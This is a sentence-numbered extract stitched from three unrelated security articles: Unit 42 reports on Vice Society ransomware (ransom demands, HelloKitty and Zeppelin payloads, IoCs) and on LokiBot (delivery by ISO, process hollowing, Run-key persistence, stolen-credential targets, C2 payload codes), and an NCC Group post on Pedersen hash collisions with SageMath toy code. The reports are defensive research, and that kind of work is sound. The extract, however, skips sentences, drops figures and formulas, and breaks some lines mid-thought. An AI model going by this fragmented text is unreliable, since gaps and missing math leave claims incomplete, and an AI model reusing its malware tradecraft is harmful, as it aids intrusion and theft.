sentence.3635: This allows us to better understand how aggressive a particular ransomware gang’s demands might be for particular industry verticals, and to get a general view into the rate at which a particular actor might drive their demands down after negotiations take place.
sentence.3636: Our observations of ransom demands by Vice Society across IR cases include: Initial demands by this actor could exceed $1 million.
sentence.3637: Final demands after negotiations were as high as $460,000.
sentence.3638: The difference between initial demands and final demands could be significant.
sentence.3639: We saw decreases as large as 60%.

sentence.3652: HelloKitty Usage At the start of the group’s observed operations in 2021, Vice Society affiliates used the HelloKitty Ransomware variant as a primary payload in their infection chain.
sentence.3653: This ransomware family was first observed in December 2020, primarily targeting Windows systems.
sentence.3654: This variant gets its name from its mutex: HELLOKITTYMutex.
sentence.3655: In July 2021, as described in our HelloKitty ATOM, Unit 42 came across a Linux (ELF) sample with the name funny_linux.elf that had a ransom note with contents similar to those of HelloKitty for Windows samples.
sentence.3656: This Linux sample led to the discovery of additional HelloKitty samples for Linux dating back to October 2020.
sentence.3657: In March 2021, HelloKitty’s Linux variant was also observed in the wild to target ESXi servers.
sentence.3658: Similar to ransomware variants like BlackCat, HelloKitty ransomware typically requires a key to execute, to hinder analysis efforts.
sentence.3659: In HelloKitty’s case, this key is typically obfuscated with AES 256 encryption.
sentence.3660: As mentioned in our previous report detailing emerging ransomware families in 2021, HelloKitty features multiple flags that could be set as command line arguments, which are detailed in Table 1 of the linked report.

sentence.3663: When the encryption process is complete, encrypted files are typically appended with an extension using the following format: .v-society.<victim ID>.
sentence.3664: Zeppelin Usage As previously mentioned, the Vice Society group has also been known to adopt other ransomware families such as Zeppelin as a part of their infection chain.
sentence.3665: Upon execution, the ransomware binary deletes itself and drops a ransom note on the victim machine’s desktop titled !!!

sentence.3671: Additional execution details include the following: Creating the HKCU\Software\Zeppelin registry key Appending an extension with the format A1A-A80-4CD to encrypted files Creating a file called README.txt.v-society Imphash: 8acb34bed3caa60cae3f08f75d53f727 Creating a temp file with a .Zeppelin extension using the following format - C:\Users\<User>\AppData\Local\Temp\7D3ED7F1.Zeppelin Conclusion School districts with limited cybersecurity capabilities and constrained resources are often the most vulnerable to threat actors.
sentence.3672: The opportunistic targeting often seen with cybercriminals can put even school districts with robust cybersecurity programs at risk.
sentence.3673: K-12 institutions may be seen as particularly lucrative targets due to the amount of sensitive student data accessible through school systems or their managed service providers.
sentence.3674: Vice Society and its consistent targeting of the education industry vertical, particularly around the September time frame, serves as a warning that this group has shaped their campaigns to take advantage of the school year in the U.S.
sentence.3675: It’s likely they’ll maintain use of these tactics to impact the cyberthreat landscape moving forward, as long as their activities continue to be lucrative for them.
sentence.3676: Educational institutions should continue to implement security best practices and be wary of the ongoing threat of ransomware, especially during the start and end of the school year.
sentence.3677: K-12 institutions and universities do have an advantage when it comes to protecting themselves that too few organizations use to its full potential.
sentence.3678: In a school environment, there are many educators who can help inform trainings for both staff and students to learn what they need to do to maintain security for everyone in the organization.
sentence.3679: Vice Society’s use of multiple ransomware payloads across both Windows and Linux hosts shows that they’re continually evolving.
sentence.3680: They will likely continue leveraging additional ransomware strains in the future, as well as exploiting newly disclosed vulnerabilities.
sentence.3681: As we do with other ransomware groups, Unit 42 strongly advises organizations that have been impacted by Vice Society to avoid paying a ransom if possible, and to instead consult a trusted IR negotiation team for the best course of action.
sentence.3682: Palo Alto Networks customers receive protections against ransomware used by Vice Society from Cortex XDR, as well as from the WildFire cloud-delivered security service for the Next-Generation Firewall.

sentence.3732: title: Spike in LokiBot Activity During Final Week of 2022 url: https://unit42.paloaltonetworks.com/lokibot-spike-analysis/ Executive Summary Unit 42 researchers have uncovered a malware distribution campaign that is delivering the LokiBot information stealer via business email compromise (BEC) phishing emails.
sentence.3733: This malware is designed to steal sensitive information from victims' systems, such as passwords and banking information, as well as other sensitive data.
sentence.3734: In this blog, we will explain how attackers used an innocent-looking email to lure victims into opening an attachment.
sentence.3735: The attachment contained a LokiBot information stealer.
sentence.3736: We will provide technical details on how the LokiBot sample uses obfuscation and a persistence mechanism to avoid detection.
sentence.3737: We will also describe the command and control (C2) channel communication.
sentence.3738: Finally, we will list the various applications from which the malware steals data.
sentence.3739: The Appendix of this blog will provide an in-depth description of each data byte in the HTTP based C2 communication, detailing the specific purpose of each byte.
sentence.3740: It will also provide a breakdown of how the data byte is structured.
sentence.3741: Palo Alto Networks customers receive protections from and mitigations for LokiBot information stealer C2 communication in the following ways: Table of Contents IntroductionLokiBot Malware AnalysisFirst
sentence.3743: Stealing FeaturePersistenceHTTP C2 CommunicationConclusionIndicators of CompromiseSamplesInfrastructureAdditional ResourcesAppendix Introduction LokiBot (often referred to as Loki-bot or Loki PWS) is notorious information-stealing malware.
sentence.3744: It collects sensitive data from web browsers, email clients, FTP servers and crypto wallets.
sentence.3745: This threat then uploads this information to an attacker-controlled machine via HTTP POST.
sentence.3746: The malware can also create a backdoor on the infected machine, enabling an attacker to install further malicious software.
sentence.3747: First identified in 2015, LokiBot has since been used in multiple security breaches.
sentence.3748: Furthermore, the malware is constantly evolving, making it difficult to contain and protect against.
sentence.3749: During the winter holiday season of 2022, Unit 42 researchers noticed that our machine learning-based C2 detection solution identified a particular HTTP payload as malicious.
sentence.3750: After analyzing its traffic patterns, we identified that it belonged to a LokiBot infection.
sentence.3751: After investigating the attack vector delivering this malware and further network traffic activity, we found the original email that included a ZIP file attached, which contained an ISO file.
sentence.3752: The ISO file had the final payload.
sentence.3753: We have found that this attempt to deliver the LokiBot malware has strong ties to a BEC campaign.
sentence.3754: BEC entails gaining unauthorized access to email leading to financial fraud, and it is one of the most prevalent and costly forms of cyberattacks today.
sentence.3755: Signs of BEC include fraudulent wire transfer requests, as well as spam or phishing emails sent from a customer’s corporate domain.
sentence.3756: Victims might also notice missing or deleted emails due to unauthorized access to email systems.
sentence.3759: When collecting data, we also analyzed additional threat intel data sources such as ThreatFox.
sentence.3760: We noticed that LokiBot activity had a relatively small amount of indicators of compromise (IoCs) when we first detected this sample.
sentence.3761: However, during the end of 2022, the number of occurrences peaked in the last three days of December.
sentence.3762: Threat actors often increase their attack efforts during U.S. or other targeted nations' holidays.
sentence.3763: During this time, cyberattacks are often more effective as security and other personnel take this time off.
sentence.3764: Figure 2 shows LokiBot activity from ThreatFox. Figure 2.
sentence.3768: The ISO file format is typically used to package the contents of an optical disc.
sentence.3769: In this instance, it is used to deliver the LokiBot malware.
sentence.3770: By using this file format, the attackers are trying to bypass malspam detection technologies that usually focus on detecting file types more commonly used in malware infection chains (e.g., EXE and DLL files, MS Office files).
sentence.3771: ISO files are also attractive to attackers because, while specific software was required to open them in the past, Windows includes an ISO file opener that mounts and opens the file with a simple double-click.
sentence.3772: To the victim, the opening process simply looks like a regular directory.
sentence.3773: Loader Opening the ISO file gives us access to a PE EXE file that is actually a loader.
sentence.3774: This file is an obfuscated .NET file using process hollowing, which is a code injection technique in which an attacker removes legitimate code from an executable and replaces it with malicious code.
sentence.3775: In this case, process hollowing was used to inject a malicious PE file into the legitimate process called aspnet_compiler.exe.
sentence.3776: Figure 3 shows some IoCs in the memory of the infected process.
sentence.3777: Dumping the PE from the process memory gives us access to the final LokiBot payload.
sentence.3779: The infected process that contains IoCs.
sentence.3780: Final Payload Obfuscation This LokiBot sample only uses one code obfuscation technique: API hashing.
sentence.3781: Malware authors use this technique to retrieve export functions from loaded libraries using a computed hash.
sentence.3782: Replicating the hashing function implementation allows us to retrieve the corresponding APIs in the appropriate library.
sentence.3783: Figure 4 shows a Python implementation of the API hashing algorithm used in the malware sample.
sentence.3786: Main Stealing Feature The main function of the sample is building two arrays of 101 elements.
sentence.3787: The first array is filled with indexes, and the second array is filled with pointers to functions.
sentence.3788: The latter are the stealing functions.
sentence.3789: These functions are made to steal credentials from different types of applications and services on the Windows operating system: Browsers: Safari, Internet Explorer, Firefox and Chromium-based browsers FTP/SSH apps and clients Backup applications Email applications Notes applications Poker applications Password managers Windows credentials The main function of the malware is looping over these stealer functions to execute them, as shown in Figure 5. Figure 5.
sentence.3791: All the credentials collected and extracted from the installed software will then be compressed by the aPLib algorithm and submitted to the C2 server through HTTP protocol using the POST method.
sentence.3792: We’ll go into this in more detail in the HTTP C2 Communication section.
sentence.3793: Persistence In order to establish persistence on the targeted host, the malware starts by saving a copy of itself in a new folder in the %APPDATA% directory via the MoveFileExW or CopyFileW Windows API.
sentence.3794: Then, it creates and sets a new value for the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
sentence.3795: This value, named as the created folder, is set to the path of the copied executable.
sentence.3796: HTTP C2 Communication LokiBot exfiltrates information to the C2 through the HTTP protocol.
sentence.3797: This information includes the bot's version number (1.8) and can be found in the two bytes of the HTTP payload.
sentence.3798: It also contains a User-Agent set as “Mozilla/4.08 (Charon; Inferno)”, and the Content-Key, which is a custom HTTP header whose value corresponds to a hash generated out of the HTTP header.
sentence.3799: Figure 6 shows a HTTP POST request and its corresponding message body.
sentence.3800: This body contains the exfiltrated information, which is highlighted in different colors for each field.
sentence.3801: We’ve also included the corresponding offset and size to provide a better visual reference of the data structure used by the malware, and to easily cross-reference each field of interest.
sentence.3803: HTTP POST request (type 27 / data exfiltration).For a detailed list of each data field (offset and size) of the HTTP body (payload) please refer to the Appendix section.
sentence.3804: Similar to other information-stealing malware, this threat searches for and exfiltrates the following information: OS architecture Built-in admin Domain host name Hostname Local admin Operating system Screen resolution Username information The exfiltrated data that is unique to this information stealer malware includes the following: Unique key, which is an identifier that includes five randomly generated characters Binary ID, which indicates a domain that is commonly used in LokiBot infections (ckav[.]ru) Mutex value, which consists of a 24-character length string (taken from hashing the machine’s GUID using the MD5 algorithm)
sentence.3805: Potential hidden files (e.g., %APPDATA%\\079D53\\3AFB91.hdb), which are taken from the mutex value (for directory name with a character range from 8-13 bytes and a file name with a character range from 13-18 bytes) Hash database (.hdb) Keylogger database (.kdb) Lock file (.lck) Malware EXE (.exe)
sentence.3806: The bot also makes use of different payload types (located at the third and fourth byte of the HTTP body).
sentence.3807: These types include the following: Stolen application/credential data (0x27) Get C2 commands from C2 Server (0x28) Exfiltrate keylogger data (0x2B) Other versions of this malware family can use additional payload types depending on the final action including the following: Exfiltrate cryptocurrency wallet (0x26) Exfiltrate files (0x29)
sentence.3809: Exfiltrate screenshots (0x2c) Conclusion LokiBot malware has been used by attackers for many years.
sentence.3810: There have been multiple versions of this threat.
sentence.3811: It takes a lot of effort for any security team to constantly monitor the behavior changes in the malware and add the necessary protections.
sentence.3812: The Palo Alto Networks machine learning-based C2 detection solution, as part of Advanced Threat Prevention, detects and stops malicious C2 activity inline.
sentence.3813: The model is regularly updated with the latest C2 communication from various types of malware.
sentence.3814: This ensures that the detection capabilities are always up to date and capable of countering the ever-evolving threats posed by malicious actors.
sentence.3815: We would like to extend our gratitude to Doel Santos from Unit 42 and Nina Smith for helping on this investigation.

title: Breaking Pedersen Hashes in Practice
url: https://research.nccgroup.com/2023/03/22/breaking-pedersen-hashes-in-practice/

The Pedersen hash function has gained popularity due to its efficiency in the arithmetic circuits used in zero-knowledge proof systems.
sentence.3824: Hash functions are a crucial primitive in cryptography, and zero-knowledge proof systems often make heavy use of them, for example when computing Merkle tree roots and paths.
sentence.3825: Instead of being based on complex bit-fiddling operations like its standard counterparts (of the SHA or BLAKE families, for example), the Pedersen hash is an algebraic hash function that is simply computed as a linear combination of points on an elliptic curve.
sentence.3826: They are therefore fairly efficient to compute in zero-knowledge circuits since their computations relies on field arithmetic, contrarily to the more traditional hash functions that have no convenient mathematical structure.
sentence.3827: Based on foundational work from the early 1990s that also led to the formalization of commitment schemes (see for example [CHP91] and [Ped91]), the (originally-named) PedersenHash function was recently put in the spotlight when Zcash researchers Sean Bowe and Daira Hopwood developed specific optimizations for its efficient instantiation in zk-SNARK circuits
sentence.3829: However, even though the security of the Pedersen hash function is well-understood (since it relies on the assumed hardness of the discrete logarithm problem), a few easily-overlooked subtleties in its definition have the potential to invalidate its security guarantees and thus completely break the security of the systems based on it.
sentence.3830: In this blog post, we start by describing the Pedersen hash function, the security guarantees it provides and some of the underlying assumptions it relies on.
sentence.3831: We then show how some of the security properties can be broken when the requirements are not met.
sentence.3832: The definition and the different attacks are accompanied by a toy example to illustrate the various concepts more concretely.

Let M be the message that we wish to hash (represented as a bit string of fixed length k ⋅ r), and let G1, G2, …, Gk be generators of the prime-order subgroup of our chosen elliptic curve group.
sentence.3834: These generators must be sampled uniformly at random, such that no relationship between them is known.
sentence.3835: Split the message M into k chunks of r bits each: M = M1M2 … Mk.
sentence.3836:
The Pedersen hash is defined as the linear combination of the points with the encoding of the message chunks:
H(M) = H(M1M2 … Mk )

Where the function ⟨⋅⟩, commonly referred to as the encoding function, converts a bit string into a scalar element (for our purpose, scalar can be interpreted as an integer less than the subgroup order).
sentence.3841: Note that the output of the hash function defined above is a point on the curve.
sentence.3842: In practice, the desired output may be a field element, in which case a single coordinate of the resulting point is often used as the hash.
sentence.3844: Pedersen Hash DefinitionWe illustrate the Pedersen Hash function and its security properties and requirements using a toy example, with accompanying code in SageMath.
sentence.3845: We use an elliptic curve with a prime group order, which is insecure by cryptographic standards due to the prime being small.
sentence.3846: We select the elliptic curve defined by the curve equation y2 = x3 + x + 42, defined over the finite field of size 127.
sentence.3847: The group of points on this curve has order 139, which is prime.
sentence.3848: We pick two generators of this group, G1 = E(1, 60) and G2 = E(2, 59).

def IdentityEncode(lebs):
    """
    Encodes a binary string (assumed to be in little-endian bit order)
    to an integer
    """
    return int(lebs[::-1], 2)

def EncodeMessage(msg, encode_function):
    """
    Helper function which encodes a message given a variable
    encode function
    """
    return [encode_function(x) for x in msg]

def GenericPedersenHash(generators, encoded_chunks):
    """
    Helper function for computing the Pedersen hash of a message

    The hash is computed as a linear combination of of the generators with
    (already encoded) chunks used as scalar multiples
    """
    assert len(generators)

    res = E(0)
    for chunk, generator in zip(encoded_chunks, generators):
        res += chunk * generator
    return res

def PedersenHash(message, encode_function=IdentityEncode, generators=GENERATORS):
    """
    Computes the Pedersen hash of a message

    Input: a message
    Output: the Pedersen Hash of the message

    Optional:
        encode_function: the encoding function to break a message into integers
        generators: elements G ∈ E which generate E
    """
    encoded_message = EncodeMessage(message, encode_function)
    return GenericPedersenHash(generators, encoded_message)

Security Properties and Requirements
The Pedersen Hash function is collision-resistant for fixed-length input, provided the underlying encoding function is injective.
sentence.3869: This security property and the definition of the hash function presented above have a few subtleties, which we now explore in more depth.
sentence.3870: The first caveat is that the hash function is not collision-resistant for variable-length inputs.
sentence.3871: It is also distinguishable from a random oracle and as such this function should not be used as a pseudorandom function (PRF).
sentence.3872: A second important aspect is that in order for this hash function to provide the desired security properties (namely, collision-resistance), it is necessary for the underlying encoding function to be injective.
sentence.3873: Recall that the property of an injective function is that it maps distinct elements of its domain to distinct elements of its codomain.
sentence.3874: In the context of the encoding function ⟨⋅⟩, this means that there are no two different message chunks Mi and Mj that result in the same encoded output, see the illustration below.
sentence.3875: The encoding function maps bit strings to scalars.
sentence.3876: In the toy example above, we have seen an example of a simple encoding function where the bit strings were interpreted in little-endian as integers and therefore was clearly injective (within the parameters of our example).
sentence.3877: But even with the simple encoding function used in the toy example, care should be taken to ensure that the allowed size of the message we hash is bounded.
sentence.3878: Indeed, if we allowed larger bit strings to be hashed (such that their encoding is larger than the subgroup order), it would be easy for an attacker to compute collisions.
sentence.3879: This is because for any point in the subgroup, multiplication by the subgroup order, call it r, yields the point-at-infinity; that is r ⋅ G = 0.
sentence.3880:
Thus, multiplying the point G by a scalar a produces the same result as multiplying G by a + k ⋅ r, for any value of k, since
(a + k ⋅ r) ⋅ G = a ⋅ G + k ⋅ r ⋅ G = a ⋅ G + k ⋅ 0 = a ⋅ G
The example below illustrates how hashing messages larger than the expected size may lead to collisions.

Recall that the output of the hash function is a point on the curve.
sentence.3891: When implementations require this output to be a field element, they sometimes extract the first coordinate of the resulting curve point, which they use as the output of the hash function.
sentence.3892: Crucially, this process can also lead to collisions.
sentence.3893: Indeed, when using a Weierstrass curve with affine coordinates, the negation of a point P = (x, y) is -P = (x, -y).
sentence.3894: Thus, when computing the Pedersen hash and taking only the first coordinate as a result, there is a natural collision, namely the negation of the point.
sentence.3895: It is important to ensure that the encoding process followed by the scalar multiplication cannot produce two points that have the same coordinate extracted as output.
sentence.3896: For example, if using affine coordinates and a curve equation in Weierstrass form, one must ensure that the function cannot produce both P and -P if only the x-coordinate is outputted.
sentence.3897: Finally, another important requirement of the Pedersen hash function is that the various generators have to be sampled uniformly at random.
sentence.3898: Specifically, the discrete logarithm of any generator with respect to another one should not be known, not even to the protocol designers.
sentence.3899: Implementers traditionally use hash-to-curve algorithms (a process which does not reveal the discrete logarithm of the output point) and nothing-up-my-sleeve numbers, to prove that the inputs to the hash-to-curve process were selected honestly.
sentence.3900: Odd-looking sets of generators or opaqueness in the generation process could be indicative of a backdoor.
sentence.3901:
Optimizations
In practice, implementations typically use slightly more complex procedures to encode bit strings to scalar.
sentence.3902: In doing so, they are able to compute point multiplications in a more efficient way, though special care needs to be taken to ensure the resulting encoding function is injective, as discussed in the previous section.
sentence.3903: The simple Pedersen Hash function presented so far can be significantly sped up in the specific contexts used by zero-knowledge proof systems.
sentence.3904: Since the generators are fixed (and known ahead of time), a method called windowed scalar multiplication can be used to more efficiently perform the multiplication by pre-computing and storing successive powers of the generators.
sentence.3905: Windowed scalar multiplication leverages the simple observation that the multiplication of a curve point by a large scalar can be decomposed.
sentence.3906: For example, assume our scalar is a 6-bit value b = b0b1b2b3b4b5, and we wish to compute the scalar multiplication b ⋅

Since the quantities in the parentheses can take any value in the {0, 7} range, one can precompute the eight values in the set {0, G, 2 ⋅ G, 3 ⋅ G, …, 7 ⋅ G} and perform a variant of a double-and-add algorithm, where at each step the doubling operation is repeated 3 times, and the adding operation involves adding one element from the pre-computed set.
sentence.3909: This variant uses the same amount of doubling operation as the standard binary double-and-add algorithm, but it uses fewer point additions (which are generally slower than doubling).
sentence.3910: Pushing the optimizations even further, the Zcash team decided to use a signed version of the windowed-multiplication method.
sentence.3911: Specifically, they use a windowed scalar multiplication with an encoding where 3-bit chunks are mapped to elements of the range {-4, …, 4} {0}, instead of the range {0, …, 7}.
sentence.3912: Nothing forces alternative implementations of the Pedersen Hash to follow the exact same encoding rules, though in practice many do.

This choice of using a signed-digit windowed-multiplication method reduces the number of constraints necessary in the arithmetic circuit (since the lookup of the negation of a point can be performed efficiently as negating a point only requires a single constraint).
sentence.3915: As discussed above, the security of Pedersen hash is guaranteed provided the encoding scheme is injective.
sentence.3916: Using such a signed representation introduces a few subtleties that should be kept in check in order to ensure the collision-resistance of the hash function.

sentence.3919: They did so by showing that the range of the encoding function ⟨⋅⟩ was a subset of the range , with  the group order.
sentence.3920: This ensures that there is no overflow of the scalar multiplier that would be “wrapped-around”, which would lead to multiple inputs mapping to the same output, a break of the injectivity requirement.
sentence.3921: They also ensured that the coordinate extraction procedure couldn’t lead to the issue described above where both a point and its negation could be obtained as the output of the hash procedure, which could be problematic when using the first-coordinate as the hash output.
sentence.3922: This is described in Section 5.4.9.4 of the Zcash protocol specification [Zcash], where Lemma 5.4.7 shows that if a given point P = (u, v) is on the curve, then (u, -v) is not on the curve, thereby preventing the potential issue outlined.
sentence.3923: Note the importance of restricting 0 in the output range of the encoding function.
sentence.3924: If the zero scalar could be obtained, the result of the scalar multiplication would be the point-at-infinity, which could lead to unexpected issues when trying to use that result.
sentence.3925: Now that we have a better understanding of the Pedersen hash and its security, let’s look at some of the attacks that apply if one were to overlook some of the requirements described so far.
sentence.3926:
Vulnerability 1: Non-unique x-coordinate
In this first vulnerability example, we show how implementations blindly using the x-coordinate of the hash output could lead to collisions.
sentence.3927: Instead of using our toy “identity” encoding, we employ Zcash’s signed-digit encoding, which maps bit strings to a range of positive and negative integers centred around 0.
sentence.3928: Recall that on a curve in Weierstrass form, the negation of a point P = (x, y) is -P = (x, -y).
sentence.3929: Considering only the x-coordinate, a collision in the hash function output occurs when two messages result in the pair of points only differing in sign.
sentence.3930:

Hence, to compute a collision for a message M, we have to find the message M′ such that the encoding of the chunks of M′ correspond to the negation of the respective encoded chunks of M, namely ⟨M1′⟩ = −⟨M1⟩ and ⟨M2′⟩ = −⟨M2⟩.
This is straightforward to perform when using Zcash’s encoding scheme, since the third bit of every 3-bit window encoded by the enc() function determines the sign of the output.
sentence.3934: Hence, given a message hash H(M), the message M’ crafted by flipping every third bit of M produces a hash output equal to the negation of H(M), which coincide in their x-coordinate.

Vulnerability 2: Related Generators
Recall that the original definition requires the generators to be sampled randomly, such that their discrete logarithm with respect to a common generator (or to each other) shall not be known.
sentence.3940: In practice, standards have been developed for that purpose, see hash-to-curve.

sentence.3956:
Vulnerability 3: Variable-length Input
While implementations usually set a fixed upper bound to the size of the input that can be hashed, they also sometimes accept arbitrary-long (or short) inputs.
sentence.3957:
Zcash’s definition of Pedersen hash is unequivocal regarding the collision-resistance of the hash function when using variable-length input, as stated on page 78 of [Zcash]:

These hash functions are not collision-resistant for variable-length inputs.
sentence.3958: One reason why allowing inputs of different sizes to be hashed may result in collisions is that padding is applied to the inputs prior to encoding them.
sentence.3959: This padding step is sometimes explicit, for example as described in the Zcash protocol specification [Zcash], where the definition of PedersenHashToPoint on page 78 specifies the following padding scheme.
sentence.3960: Pad to a multiple of 3 bits by appending zero bits, giving ′.
sentence.3961: But this padding step may also be implicit, such as when using the “identity” encoding and hashing messages of unexpected lengths.
sentence.3962: In that case, the missing or superfluous bits would simply be interpreted as zeros.
sentence.3963: We illustrate the issue with our toy example.

sentence.3970: In addition to issues that are exclusively related to padding, the ability to hash larger messages may break injectivity of the function.
sentence.3971: The toy example in the Definition section also illustrated how hashing messages larger than the expected size may lead to collisions.
sentence.3972:
Conclusion
While the Pedersen hash function has many desirable advantages due to its simplicity, efficiency in arithmetic circuits, and the known security assumption it relies on, it is also susceptible to many pitfalls.
sentence.3973: Specifically, implementations adapting the Zcash approach but on different curves or with different encoding schemes may result in fragile constructions vulnerable to subtle issues, as illustrated in this blog post.
